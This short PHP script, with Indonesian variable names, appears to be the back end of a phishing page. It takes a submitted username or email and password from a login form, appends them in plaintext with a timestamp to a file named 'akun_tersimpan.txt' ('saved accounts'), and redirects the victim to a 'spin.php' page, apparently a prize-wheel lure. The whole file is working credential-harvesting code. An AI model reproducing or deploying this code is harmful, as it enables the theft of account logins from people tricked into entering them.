<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['username'];
    $password = $_POST['password'];
    $waktu = date("Y-m-d H:i:s");

    $data = "[$waktu] Email: $email | Password: $password" . PHP_EOL;

    file_put_contents("akun_tersimpan.txt", $data, FILE_APPEND);

    header("Location: spin.php");
    exit();
} else {
    echo "Akses tidak sah.";
}
?>
